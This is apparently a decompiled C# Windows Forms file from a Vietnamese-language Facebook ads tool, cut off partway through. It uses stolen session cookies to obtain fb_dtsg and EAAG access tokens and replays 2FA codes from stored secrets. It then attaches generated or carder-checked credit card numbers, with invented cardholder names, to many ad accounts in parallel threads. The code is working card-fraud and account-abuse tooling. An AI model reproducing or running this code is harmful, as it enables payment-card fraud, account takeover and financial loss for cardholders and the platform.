using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Authentication;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using ADSPRoject.BinGen;
using ADSPRoject.Data;
using ADSPRoject.Server;
using CreditCardValidator;
using xNet;

namespace ADSPRoject;

public class frmAddCard : Form
{
	[Serializable]
	[CompilerGenerated]
	private sealed class _003C_003Ec
	{
		public static readonly _003C_003Ec _003C_003E9 = new _003C_003Ec();

		public static Func<ActClass, bool> _003C_003E9__16_0;

		public static Func<ActClass, bool> _003C_003E9__17_0;

		internal T0 _003CtxtSucess_TextChanged_003Eb__16_0<T0>(ActClass a)
		{
			//IL_001b: Expected O, but got I4
			return (T0)a.Status.Equals(frmMain.STATUS.Done.ToString());
		}

		internal T0 _003Ctxtlỗi_TextChanged_003Eb__17_0<T0>(ActClass a)
		{
			//IL_001b: Expected O, but got I4
			return (T0)a.Status.Equals(frmMain.STATUS.lỗi.ToString());
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass13_0
	{
		public int countThread;

		public frmAddCard _003C_003E4__this;

		public ParameterizedThreadStart _003C_003E9__0;

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal unsafe void _003Cstart_003Eb__0<T0, T1, T2, T3, T4, T5, T6, T7>(T5 obj)
		{
			//IL_000c: Expected O, but got I4
			//IL_001d: Expected I4, but got O
			//IL_0060: Unknown result type (might be due to invalid IL or missing references)
			//IL_006a: Expected O, but got Unknown
			//IL_0093: Expected O, but got I4
			//IL_00a9: Expected O, but got I4
			//IL_00e5: Expected O, but got I4
			//IL_012d: Expected O, but got I4
			//IL_0219: Expected O, but got I4
			//IL_0247: Expected I4, but got O
			//IL_0266: Expected O, but got I4
			//IL_026d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0270: Expected O, but got Unknown
			//IL_02a0: Expected O, but got I4
			//IL_02cb: Expected O, but got I4
			//IL_02e0: Expected I4, but got O
			//IL_0374: Expected I4, but got O
			//IL_03c7: Expected I4, but got O
			//IL_03f5: Expected O, but got I4
			//IL_043c: Expected I4, but got O
			//IL_0477: Expected I4, but got O
			//IL_04a5: Expected O, but got I4
			//IL_04ec: Expected I4, but got O
			//IL_0537: Expected I4, but got O
			//IL_05c0: Expected O, but got I4
			//IL_05dc: Expected I4, but got O
			//IL_05f5: Expected O, but got I4
			//IL_05f9: Unknown result type (might be due to invalid IL or missing references)
			//IL_05ff: Expected I4, but got Unknown
			T0 val = (T0)int.Parse(obj.ToString());
			_003C_003E4__this.listAct[(int)val].Status = frmMain.STATUS.Processing.ToString();
			T1 val2 = (T1)Activator.CreateInstance(typeof(HttpRequest));
			((HttpRequest)val2).SslProtocols = SslProtocols.Tls12;
			ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;
			((HttpRequest)val2).Cookies = new CookieDictionary(false);
			((HttpRequest)val2).AllowAutoRedirect = true;
			((HttpRequest)val2).Cookies = _003C_003E4__this.httpRequest.Cookies;
			T2 val3 = (T2)_003C_003E4__this.AddCard;
			if (val3 != null)
			{
				CreditCardEntity creditCardEntity = null;
				T2 val4 = (T2)_003C_003E4__this.AddBinGen;
				if (val4 != null)
				{
					T3 val5 = (T3)"";
					while (true)
					{
						T4 enumerator = (T4)_003C_003E4__this.listBinGen.GetEnumerator();
						try
						{
							while (((List<BinGenClass>.Enumerator*)(&enumerator))->MoveNext())
							{
								BinGenClass current = ((List<BinGenClass>.Enumerator*)(&enumerator))->Current;
								T2 val6 = (T2)current.Status.Equals(frmMain.STATUS.Ready.ToString());
								if (val6 != null)
								{
									val5 = (T3)current.Bin;
									current.Status = frmMain.STATUS.Used.ToString();
									break;
								}
							}
						}
						finally
						{
							((IDisposable)(*(List<BinGenClass>.Enumerator*)(&enumerator))).Dispose();
						}
						T2 val7 = (T2)string.IsNullOrWhiteSpace((string)val5);
						if (val7 == null)
						{
							break;
						}
						T4 enumerator2 = (T4)_003C_003E4__this.listBinGen.GetEnumerator();
						try
						{
							while (((List<BinGenClass>.Enumerator*)(&enumerator2))->MoveNext())
							{
								BinGenClass current2 = ((List<BinGenClass>.Enumerator*)(&enumerator2))->Current;
								current2.Status = frmMain.STATUS.Ready.ToString();
							}
						}
						finally
						{
							((IDisposable)(*(List<BinGenClass>.Enumerator*)(&enumerator2))).Dispose();
						}
					}
					creditCardEntity = new CreditCardEntity();
					T3 cardGen = BinGen2Class.getCardGen<T0, T3, CreditCardDetector, T2, Regex, DateTime, T6, T5>(val5);
					creditCardEntity.Card_Number = ((string)cardGen).Split((char[])(object)new T6[1] { (T6)124 })[0];
					creditCardEntity.Exp_Month = ((string)cardGen).Split((char[])(object)new T6[1] { (T6)124 })[1];
					creditCardEntity.Exp_Year = ((string)cardGen).Split((char[])(object)new T6[1] { (T6)124 })[2];
					creditCardEntity.Card_Security = ((string)cardGen).Split((char[])(object)new T6[1] { (T6)124 })[3];
				}
				else
				{
					T0 val8 = (T0)0;
					while (true)
					{
						T2 val9 = (T2)((nint)val8 < _003C_003E4__this.frmMain.listFBEntity[_003C_003E4__this.indexEntity].listCard.Count);
						if (val9 != null)
						{
							CreditCardEntity creditCardEntity2 = _003C_003E4__this.frmMain.listFBEntity[_003C_003E4__this.indexEntity].listCard[(int)val8];
							T2 val10 = (T2)creditCardEntity2.Status.Equals(frmMain.STATUS.Ready.ToString());
							if (val10 == null)
							{
								val8 = (T0)(val8 + 1);
								continue;
							}
							creditCardEntity2.Status = frmMain.STATUS.Processing.ToString();
							creditCardEntity = creditCardEntity2;
							break;
						}
						break;
					}
				}
				T2 val11 = (T2)(creditCardEntity == null);
				if (val11 != null)
				{
					_003C_003E4__this.listAct[(int)val].Status = "Hết thẻ";
				}
				else
				{
					T3 cardholder_name = (T3)(_003C_003E4__this.firstName[_003C_003E4__this.rnd.Next(0, _003C_003E4__this.firstName.Length - 1)] + " " + _003C_003E4__this.lastName[_003C_003E4__this.rnd.Next(0, _003C_003E4__this.lastName.Length - 1)]);
					T3 outMessage = (T3)"";
					T2 val12 = _003C_003E4__this.addCart<T3, T0, T2, T7, T1>(val2, (T3)_003C_003E4__this.listAct[(int)val].Act, (T3)_003C_003E4__this.CountryCard, cardholder_name, (T3)creditCardEntity.Card_Number, (T3)creditCardEntity.Card_Security, (T3)creditCardEntity.Exp_Month, (T3)creditCardEntity.Exp_Year, out *(string*)(&outMessage));
					T2 val13 = val12;
					if (val13 != null)
					{
						_003C_003E4__this.listAct[(int)val].Status = frmMain.STATUS.Done.ToString();
						T2 val14 = (T2)(!string.IsNullOrWhiteSpace(_003C_003E4__this.txtSucess.Text));
						if (val14 != null)
						{
							_003C_003E4__this.txtSucess.Text += ",";
						}
						_003C_003E4__this.txtSucess.Text += _003C_003E4__this.listAct[(int)val].Act;
						creditCardEntity.Status = frmMain.STATUS.Done.ToString();
					}
					else
					{
						_003C_003E4__this.listAct[(int)val].Status = frmMain.STATUS.lỗi.ToString();
						T2 val15 = (T2)(!string.IsNullOrWhiteSpace(_003C_003E4__this.txtlỗi.Text));
						if (val15 != null)
						{
							_003C_003E4__this.txtlỗi.Text += ",";
						}
						_003C_003E4__this.txtlỗi.Text += _003C_003E4__this.listAct[(int)val].Act;
						creditCardEntity.Status = frmMain.STATUS.Declined.ToString();
					}
					_003C_003E4__this.txtLog.AppendText(string.Concat((string[])(object)new T3[12]
					{
						(T3)_003C_003E4__this.listAct[(int)val].Act.Substring(0, 4),
						(T3)"-",
						(T3)creditCardEntity.Card_Number,
						(T3)"|",
						(T3)creditCardEntity.Exp_Month,
						(T3)"|",
						(T3)creditCardEntity.Exp_Year,
						(T3)"|",
						(T3)creditCardEntity.Card_Security,
						(T3)": ",
						outMessage,
						(T3)Environment.NewLine
					}));
				}
			}
			T2 val16 = (T2)_003C_003E4__this.ApprovedPayment;
			if (val16 != null)
			{
				_003C_003E4__this.approved_payment<T3, T2, T1>(val2, (T3)_003C_003E4__this.listAct[(int)val].Act);
			}
			((HttpRequest)val2).Close();
			T0 val17 = (T0)countThread;
			countThread = val17 - 1;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass30_0
	{
		public frmAddCard _003C_003E4__this;

		public int isX10;

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal void _003CpasteCCEvent_003Eb__0<T0, T1, T2, T3, T4>(T4 param)
		{
			//IL_001e: Expected O, but got I4
			//IL_0077: Expected O, but got I4
			//IL_00b4: Expected O, but got I4
			//IL_00e6: Expected O, but got I4
			//IL_00ec: Expected O, but got I4
			//IL_00fb: Expected O, but got I4
			//IL_0196: Expected O, but got I4
			//IL_01ab: Expected I4, but got O
			//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
			//IL_01b1: Expected O, but got Unknown
			//IL_0229: Expected O, but got I4
			//IL_0248: Expected O, but got I4
			//IL_0269: Expected O, but got I4
			//IL_02e5: Unknown result type (might be due to invalid IL or missing references)
			//IL_02e8: Expected O, but got Unknown
			//IL_02f4: Expected O, but got I4
			//IL_02fe: Unknown result type (might be due to invalid IL or missing references)
			//IL_0301: Expected O, but got Unknown
			T0 text = (T0)Clipboard.GetText();
			T0[] array = (T0[])(object)((string)text).Split("\r\n".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
			CreditCardEntity creditCardEntity = null;
			T2 val = (T2)1;
			T1 val2 = (T1)(_003C_003E4__this.frmMain.listFBEntity[_003C_003E4__this.indexEntity].listCard != null && _003C_003E4__this.frmMain.listFBEntity[_003C_003E4__this.indexEntity].listCard.Count > 0);
			if (val2 != null)
			{
				T1 val3 = (T1)(!string.IsNullOrWhiteSpace(_003C_003E4__this.frmMain.listFBEntity[_003C_003E4__this.indexEntity].listCard.First().Card_Number));
				if (val3 != null)
				{
					val = (T2)(_003C_003E4__this.frmMain.listFBEntity[_003C_003E4__this.indexEntity].listCard.Count + 1);
				}
			}
			T0[] array2 = array;
			T2 val4 = (T2)0;
			while ((nint)val4 < array2.Length)
			{
				T0 val5 = (T0)((object[])(object)array2)[(object)val4];
				T2 val6 = (T2)0;
				while (true)
				{
					T1 val7 = (T1)((nint)val6 < isX10);
					if (val7 == null)
					{
						break;
					}
					T0 val8 = (T0)((string)val5).Replace(" ", "");
					val8 = (T0)((string)val8).Replace("\\", "|").Replace("/", "|").Replace("[", "|")
						.Replace(" ", "")
						.Replace("Live|", "")
						.Replace("|BIN:---]|GATE:01]@/ChkNET-ID", "");
					T1 val9 = (T1)(!string.IsNullOrEmpty((string)val8) && ((string)val8).Contains("|"));
					if (val9 != null)
					{
						creditCardEntity = new CreditCardEntity
						{
							Row = (int)val
						};
						val = (T2)(val + 1);
						creditCardEntity.Card_Number = ((string)val8).Split((char[])(object)new T3[1] { (T3)124 })[0];
						creditCardEntity.Exp_Month = ((string)val8).Split((char[])(object)new T3[1] { (T3)124 })[1];
						creditCardEntity.Exp_Year = ((string)val8).Split((char[])(object)new T3[1] { (T3)124 })[2];
						creditCardEntity.Card_Security = ((string)val8).Split((char[])(object)new T3[1] { (T3)124 })[3];
						T1 val10 = (T1)(creditCardEntity.Exp_Year.Length > 2);
						if (val10 != null)
						{
							creditCardEntity.Exp_Year = System.Runtime.CompilerServices.Unsafe.As<T3, char>(ref (T3)creditCardEntity.Exp_Year[creditCardEntity.Exp_Year.Length - 2]).ToString() + System.Runtime.CompilerServices.Unsafe.As<T3, char>(ref (T3)creditCardEntity.Exp_Year[creditCardEntity.Exp_Year.Length - 1]);
						}
						creditCardEntity.Status = frmMain.STATUS.Ready.ToString();
						creditCardEntity.UID = "";
						creditCardEntity.int_random = _003C_003E4__this.rnd.Next(1, 99999);
						_003C_003E4__this.frmMain.listFBEntity[_003C_003E4__this.indexEntity].listCard.Add(creditCardEntity);
					}
					val6 = (T2)(val6 + 1);
				}
				val4 = (T2)(val4 + 1);
			}
			_003C_003E4__this.loadCC<T1, T2>();
		}
	}

	public HttpRequest httpRequest = (HttpRequest)Activator.CreateInstance(typeof(HttpRequest));

	public frmMain frmMain;

	public int indexEntity;

	public bool isLogined = false;

	private List<ActClass> listAct = (List<ActClass>)Activator.CreateInstance(typeof(List<ActClass>));

	private bool isRunning = false;

	public string[] firstName = new string[10] { "Alexander", "Henry", "Lucas", "Benjamin", "James", "William", "Elijah", "Oliver", "Noah", "Liam" };

	public string[] lastName = new string[12]
	{
		"Aiden", "Theodore", "Owen", "Jack", "Mateo", "Sebastian", "Levi", "Jackson", "Logan", "Jacob",
		"Daniel", "Ethan"
	};

	private int intThread = 0;

	private List<BinGenClass> listBinGen = (List<BinGenClass>)Activator.CreateInstance(typeof(List<BinGenClass>));

	private string CountryCard;

	private Random rnd = (Random)Activator.CreateInstance(typeof(Random));

	private bool AddAllCard = false;

	private bool AddBinGen;

	private bool AddCard = true;

	private bool ApprovedPayment = true;

	private IContainer components = null;

	private Label lbStatus;

	private TextBox txtBinGen;

	private DataGridView gvCard;

	private SplitContainer splitContainer1;

	private GroupBox grouplỗi;

	private TextBox txtlỗi;

	private GroupBox groupDone;

	private TextBox txtSucess;

	private GroupBox groupTKQC;

	private TextBox txtAct;

	private Button btnStart;

	private Label lbTotallỗi;

	private Label lbTotalSucess;

	private Label lbTotalAct;

	private Label label1;

	private NumericUpDown numThread;

	private Label label2;

	private TextBox txtCountryCard;

	private GroupBox groupBox1;

	private Label label3;

	private TextBox txtLog;

	private Label lbCard;

	private CheckBox cbAddAllCard;

	private CheckBox cbAddBinGen;

	private Label lbTotalBinGen;

	private CheckBox cbAddCard;

	private CheckBox cbApprovedPayment;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public frmAddCard(frmMain frm, int index)
	{
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Expected O, but got Unknown
		Control.CheckForIllegalCrossThreadCalls = false;
		InitializeComponent<ComponentResourceManager, Label, TextBox, DataGridView, SplitContainer, CheckBox, GroupBox, Button, NumericUpDown, string, int, bool, object, EventArgs, char, ContextMenu, MenuItem, MouseEventArgs, decimal, Icon, FormClosingEventArgs>();
		httpRequest.SslProtocols = SslProtocols.Tls12;
		ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;
		httpRequest.Cookies = new CookieDictionary(false);
		httpRequest.AllowAutoRedirect = true;
		frmMain = frm;
		indexEntity = index;
		Text = frmMain.listFBEntity[indexEntity].Name + "-" + frmMain.listFBEntity[indexEntity].UID;
		lbStatus.Text = "Check cookie";
		gvCard.AutoGenerateColumns = false;
		gvCard.Columns.Clear();
		GenColumn_Card<bool, DataGridViewCheckBoxColumn, DataGridViewTextBoxColumn, string>("string", "Card_Number", "Card_Number");
		GenColumn_Card<bool, DataGridViewCheckBoxColumn, DataGridViewTextBoxColumn, string>("string", "Exp_Month", "Exp_Month");
		GenColumn_Card<bool, DataGridViewCheckBoxColumn, DataGridViewTextBoxColumn, string>("string", "Exp_Year", "Exp_Year");
		GenColumn_Card<bool, DataGridViewCheckBoxColumn, DataGridViewTextBoxColumn, string>("string", "Card_Security", "Card_Security");
		GenColumn_Card<bool, DataGridViewCheckBoxColumn, DataGridViewTextBoxColumn, string>("string", "Status", "Status");
		checkCookie<string, int, bool, Exception, char>();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void GenColumn_Card<T0, T1, T2, T3>(T3 typeColumn, T3 HeaderText, T3 DataPropertyName)
	{
		//IL_0012: Expected O, but got I4
		T0 val = (T0)((string)typeColumn).ToLower().Equals("bool");
		if (val != null)
		{
			T1 val2 = (T1)Activator.CreateInstance(typeof(DataGridViewCheckBoxColumn));
			((DataGridViewColumn)val2).DataPropertyName = (string)DataPropertyName;
			((DataGridViewColumn)val2).HeaderText = (string)HeaderText;
			((DataGridViewColumn)val2).Name = "cl" + (string)HeaderText;
			gvCard.Columns.Add((DataGridViewColumn)val2);
		}
		else
		{
			T2 val3 = (T2)Activator.CreateInstance(typeof(DataGridViewTextBoxColumn));
			((DataGridViewColumn)val3).DataPropertyName = (string)DataPropertyName;
			((DataGridViewColumn)val3).HeaderText = (string)HeaderText;
			((DataGridViewColumn)val3).Name = "cl" + (string)HeaderText;
			gvCard.Columns.Add((DataGridViewColumn)val3);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkCookie<T0, T1, T2, T3, T4>()
	{
		//IL_002f: Expected O, but got I4
		//IL_0043: Expected O, but got I4
		//IL_0045: Expected O, but got I4
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_00e6: Expected O, but got I4
		//IL_0127: Expected O, but got I4
		//IL_016c: Expected O, but got I4
		//IL_01e7: Expected O, but got I4
		//IL_01fc: Expected O, but got I4
		try
		{
			T0[] array = (T0[])(object)frmMain.listFBEntity[indexEntity].Cookie.Split((char[])(object)new T4[1] { (T4)59 });
			T1 val = (T1)0;
			while ((nint)val < array.Length)
			{
				T0 val2 = (T0)((object[])(object)array)[(object)val];
				try
				{
					T2 val3 = (T2)((IEnumerable<T4>)val2).Contains((T4)61);
					if (val3 != null)
					{
						((Dictionary<string, string>)(object)httpRequest.Cookies).Add(((string)((IEnumerable<T0>)(object)((string)val2).Split((char[])(object)new T4[1] { (T4)61 })).First()).Trim(), ((string)((IEnumerable<T0>)(object)((string)val2).Split((char[])(object)new T4[1] { (T4)61 })).Last()).Trim());
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.Message);
				}
				val = (T1)(val + 1);
			}
			T0 input = (T0)((object)httpRequest.Get("https://m.facebook.com/home.php", (RequestParams)null)).ToString();
			T0 value = (T0)Regex.Match((string)input, "name=\"fb_dtsg\" value=\"(.*?)\"").Groups[1].Value;
			T2 val4 = (T2)string.IsNullOrWhiteSpace((string)value);
			if (val4 != null)
			{
				input = (T0)((object)httpRequest.Get("https://mbasic.facebook.com/home.php", (RequestParams)null)).ToString();
				value = (T0)Regex.Match((string)input, "name=\"fb_dtsg\" value=\"(.*?)\"").Groups[1].Value;
			}
			T2 val5 = (T2)string.IsNullOrWhiteSpace((string)value);
			if (val5 != null)
			{
				input = (T0)((object)httpRequest.Get("https://www.facebook.com/home.php", (RequestParams)null)).ToString();
				value = (T0)Regex.Match((string)input, "name=\"fb_dtsg\" value=\"(.*?)\"").Groups[1].Value;
			}
			T2 val6 = (T2)(((string)value).Length > 20);
			if (val6 == null)
			{
				lbStatus.Text = "Cookie checkpoint";
				lbStatus.ForeColor = Color.Red;
				btnStart.Enabled = false;
				return;
			}
			isLogined = true;
			frmMain.listFBEntity[indexEntity].fb_dtsg = (string)value;
			T2 val7 = (T2)string.IsNullOrWhiteSpace(frmMain.listFBEntity[indexEntity].TokenEAAG);
			if (val7 != null)
			{
				T2 val8 = (T2)(getTokenEAAG<T0, T2, HttpRequest, T1, T3, byte, T4>(httpRequest) == null);
				if (val8 != null)
				{
					getTokenEAAG_EEAB<T0, T2, HttpRequest, T1, T3, byte, T4>(httpRequest);
				}
			}
			lbStatus.Text = "Live";
			lbStatus.ForeColor = Color.Green;
			btnStart.Enabled = true;
		}
		catch (Exception ex2)
		{
			frmMain.errorMessage((T0)ex2.Message);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public T1 getTokenEAAG_EEAB<T0, T1, T2, T3, T4, T5, T6>(T2 A_0)
	{
		//IL_002c: Expected O, but got I4
		//IL_007c: Expected O, but got I4
		//IL_0166: Expected O, but got I4
		//IL_0240: Expected O, but got I4
		//IL_026e: Expected O, but got I4
		//IL_02c5: Expected O, but got I4
		//IL_02e8: Expected O, but got I4
		//IL_02f2: Expected O, but got I4
		T0 empty = (T0)string.Empty;
		try
		{
			T0 empty2 = (T0)string.Empty;
			empty = (T0)((object)((HttpRequest)A_0).Get("https://business.facebook.com/adsmanager/manage/campaigns", (RequestParams)null)).ToString();
			T1 val = (T1)((string)empty).Contains("campaigns?act=");
			if (val != null)
			{
				T0 value = (T0)Regex.Match((string)empty, "act=(.*?)\"").Groups[1].Value;
				value = (T0)"https://www.facebook.com/adsmanager/manage/campaigns?act=303891591831736";
				empty = (T0)((object)((HttpRequest)A_0).Get((string)value, (RequestParams)null)).ToString();
			}
			T1 val2 = (T1)((HttpRequest)A_0).Address.ToString().Contains("twofactor");
			if (val2 != null)
			{
				while (true)
				{
					T1 val3 = (T1)(frmMain.listFBEntity[indexEntity].Code2FA == null);
					if (val3 != null)
					{
						frmMain.listFBEntity[indexEntity].Code2FA = "";
					}
					empty2 = ChromeControl.authenCode<T3, T1, T0, T4, T5, T6>((T0)frmMain.listFBEntity[indexEntity].Code2FA);
					empty = (T0)((object)((HttpRequest)A_0).Post(ResouceControl.getResouce("RESOUCE_API_2FA"), string.Concat((string[])(object)new T0[7]
					{
						(T0)"approvals_code=",
						empty2,
						(T0)"&save_device=false&__user=",
						(T0)frmMain.listFBEntity[indexEntity].UID,
						(T0)"&__a=1&__dyn=&__csr=&__req=9&__hs=19108.BP:DEFAULT.2.0.0.0.&dpr=1.5&__ccg=EXCELLENT&__rev=1005404255&__s=n7y7to:i7topm:vo61pg&__hsi=7090761015361603355-0&__comet_req=0&fb_dtsg=",
						(T0)frmMain.listFBEntity[indexEntity].fb_dtsg,
						(T0)"&jazoest=21954&lsd=Qf7z54nRePaFgnLxvbGQyN&__spin_r=1005404255&__spin_b=trunk&__spin_t=1650946451&__jssesw=1"
					}), "application/x-www-form-urlencoded")).ToString();
					T1 val4 = (T1)(!((string)empty).Contains("\"codeConfirmed\":true"));
					if (val4 != null)
					{
						empty2 = ChromeControl.authenCode<T3, T1, T0, T4, T5, T6>((T0)frmMain.listFBEntity[indexEntity].Code2FA);
						empty = (T0)((object)((HttpRequest)A_0).Post(ResouceControl.getResouce("RESOUCE_API_2FA"), string.Concat((string[])(object)new T0[7]
						{
							(T0)"approvals_code=",
							empty2,
							(T0)"&save_device=false&__user=",
							(T0)frmMain.listFBEntity[indexEntity].UID,
							(T0)"&__a=1&__dyn=&__csr=&__req=9&__hs=19108.BP:DEFAULT.2.0.0.0.&dpr=1.5&__ccg=EXCELLENT&__rev=1005404255&__s=n7y7to:i7topm:vo61pg&__hsi=7090761015361603355-0&__comet_req=0&fb_dtsg=",
							(T0)frmMain.listFBEntity[indexEntity].fb_dtsg,
							(T0)"&jazoest=21954&lsd=Qf7z54nRePaFgnLxvbGQyN&__spin_r=1005404255&__spin_b=trunk&__spin_t=1650946451&__jssesw=1"
						}), "application/x-www-form-urlencoded")).ToString();
						empty = (T0)((object)((HttpRequest)A_0).Get(ResouceControl.getResouce("RESOUCE_API_CONTEN_MANAGENT"), (RequestParams)null)).ToString();
					}
					T1 val5 = (T1)((string)empty).Contains("\"codeConfirmed\":true");
					if (val5 != null)
					{
						break;
					}
					Thread.Sleep(3000);
				}
				empty = (T0)((object)((HttpRequest)A_0).Get(ResouceControl.getResouce("RESOUCE_API_CONTEN_MANAGENT"), (RequestParams)null)).ToString();
			}
			T0 val6 = (T0)("EAAG" + Regex.Match((string)empty, "\"EAAG(\\w+)\"").Groups[1].Value);
			T1 val7 = (T1)(((string)val6).Length > 4);
			if (val7 != null)
			{
				frmMain.listFBEntity[indexEntity].TokenEAAG = (string)val6;
				return (T1)1;
			}
		}
		catch
		{
		}
		return (T1)0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public T1 getTokenEAAG<T0, T1, T2, T3, T4, T5, T6>(T2 A_0)
	{
		//IL_003b: Expected O, but got I4
		//IL_0114: Expected O, but got I4
		//IL_01ee: Expected O, but got I4
		//IL_0243: Expected O, but got I4
		//IL_0297: Expected O, but got I4
		//IL_02ba: Expected O, but got I4
		//IL_02c4: Expected O, but got I4
		T0 empty = (T0)string.Empty;
		try
		{
			T0 empty2 = (T0)string.Empty;
			empty = (T0)((object)((HttpRequest)A_0).Get(ResouceControl.getResouce("RESOUCE_API_CONTEN_MANAGENT"), (RequestParams)null)).ToString();
			T1 val = (T1)((HttpRequest)A_0).Address.ToString().Contains("twofactor");
			if (val == null)
			{
				Console.WriteLine(((HttpRequest)A_0).Address.ToString());
			}
			else
			{
				while (true)
				{
					T1 val2 = (T1)(frmMain.listFBEntity[indexEntity].Code2FA == null);
					if (val2 != null)
					{
						frmMain.listFBEntity[indexEntity].Code2FA = "";
					}
					empty2 = ChromeControl.authenCode<T3, T1, T0, T4, T5, T6>((T0)frmMain.listFBEntity[indexEntity].Code2FA);
					empty = (T0)((object)((HttpRequest)A_0).Post(ResouceControl.getResouce("RESOUCE_API_2FA"), string.Concat((string[])(object)new T0[7]
					{
						(T0)"approvals_code=",
						empty2,
						(T0)"&save_device=false&__user=",
						(T0)frmMain.listFBEntity[indexEntity].UID,
						(T0)"&__a=1&__dyn=&__csr=&__req=9&__hs=19108.BP:DEFAULT.2.0.0.0.&dpr=1.5&__ccg=EXCELLENT&__rev=1005404255&__s=n7y7to:i7topm:vo61pg&__hsi=7090761015361603355-0&__comet_req=0&fb_dtsg=",
						(T0)frmMain.listFBEntity[indexEntity].fb_dtsg,
						(T0)"&jazoest=21954&lsd=Qf7z54nRePaFgnLxvbGQyN&__spin_r=1005404255&__spin_b=trunk&__spin_t=1650946451&__jssesw=1"
					}), "application/x-www-form-urlencoded")).ToString();
					T1 val3 = (T1)(!((string)empty).Contains("\"codeConfirmed\":true"));
					if (val3 != null)
					{
						empty2 = ChromeControl.authenCode<T3, T1, T0, T4, T5, T6>((T0)frmMain.listFBEntity[indexEntity].Code2FA);
						empty = (T0)((object)((HttpRequest)A_0).Post(ResouceControl.getResouce("RESOUCE_API_2FA"), string.Concat((string[])(object)new T0[7]
						{
							(T0)"approvals_code=",
							empty2,
							(T0)"&save_device=false&__user=",
							(T0)frmMain.listFBEntity[indexEntity].UID,
							(T0)"&__a=1&__dyn=&__csr=&__req=9&__hs=19108.BP:DEFAULT.2.0.0.0.&dpr=1.5&__ccg=EXCELLENT&__rev=1005404255&__s=n7y7to:i7topm:vo61pg&__hsi=7090761015361603355-0&__comet_req=0&fb_dtsg=",
							(T0)frmMain.listFBEntity[indexEntity].fb_dtsg,
							(T0)"&jazoest=21954&lsd=Qf7z54nRePaFgnLxvbGQyN&__spin_r=1005404255&__spin_b=trunk&__spin_t=1650946451&__jssesw=1"
						}), "application/x-www-form-urlencoded")).ToString();
						empty = (T0)((object)((HttpRequest)A_0).Get(ResouceControl.getResouce("RESOUCE_API_CONTEN_MANAGENT"), (RequestParams)null)).ToString();
					}
					T1 val4 = (T1)((string)empty).Contains("\"codeConfirmed\":true");
					if (val4 != null)
					{
						break;
					}
					Thread.Sleep(3000);
				}
				empty = (T0)((object)((HttpRequest)A_0).Get(ResouceControl.getResouce("RESOUCE_API_CONTEN_MANAGENT"), (RequestParams)null)).ToString();
			}
			T0 val5 = (T0)("EAAG" + Regex.Match((string)empty, "\"EAAG(\\w+)\"").Groups[1].Value);
			T1 val6 = (T1)(((string)val5).Length > 4);
			if (val6 != null)
			{
				frmMain.listFBEntity[indexEntity].TokenEAAG = (string)val5;
				return (T1)1;
			}
		}
		catch
		{
		}
		return (T1)0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtAct_TextChanged<T0, T1, T2, T3, T4, T5>(T3 sender, T4 e)
	{
		//IL_0070: Expected O, but got I4
		//IL_0083: Expected O, but got I4
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		//IL_00d7: Expected O, but got I4
		T0 val = (T0)txtAct.Text.Replace("\r\n", ",").Replace("\n", ",").Replace("|", ",")
			.Replace(" ", "");
		listAct.Clear();
		T0[] array = (T0[])(object)((string)val).Split((char[])(object)new T5[1] { (T5)44 });
		T0[] array2 = array;
		T1 val2 = (T1)0;
		while ((nint)val2 < array2.Length)
		{
			T0 val3 = (T0)((object[])(object)array2)[(object)val2];
			T2 val4 = (T2)(!string.IsNullOrWhiteSpace((string)val3));
			if (val4 != null)
			{
				listAct.Add(new ActClass
				{
					Act = ((string)val3).Trim(),
					Status = frmMain.STATUS.Ready.ToString()
				});
			}
			val2 = (T1)(val2 + 1);
		}
		lbTotalAct.Text = System.Runtime.CompilerServices.Unsafe.As<T1, int>(ref (T1)listAct.Count).ToString();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void btnStart_Click<T0, T1, T2>(T1 sender, T2 e)
	{
		//IL_0011: Expected O, but got I4
		//IL_0046: Expected O, but got I4
		T0 val = (T0)string.IsNullOrWhiteSpace(txtCountryCard.Text);
		if (val != null)
		{
			txtCountryCard.Focus();
			frmMain.errorMessage("Nhập mã quốc gia thẻ!!");
			return;
		}
		isRunning = !isRunning;
		T0 val2 = (T0)isRunning;
		if (val2 != null)
		{
			btnStart.Text = "STOP";
			btnStart.BackColor = Color.Red;
			txtlỗi.Text = "";
			txtSucess.Text = "";
			new Thread(start<int, Thread, T0, ParameterizedThreadStart, Exception>).Start();
		}
		else
		{
			btnStart.Text = "START";
			btnStart.BackColor = Color.Blue;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void start<T0, T1, T2, T3, T4>()
	{
		//IL_0017: Expected O, but got I4
		//IL_001e: Expected O, but got I4
		//IL_0055: Expected O, but got I4
		//IL_0094: Expected O, but got I4
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Expected I4, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_00b2: Expected O, but got I4
		//IL_00bb: Expected O, but got I4
		try
		{
			_003C_003Ec__DisplayClass13_0 _003C_003Ec__DisplayClass13_ = new _003C_003Ec__DisplayClass13_0();
			_003C_003Ec__DisplayClass13_._003C_003E4__this = this;
			_003C_003Ec__DisplayClass13_.countThread = 0;
			T0 val = (T0)0;
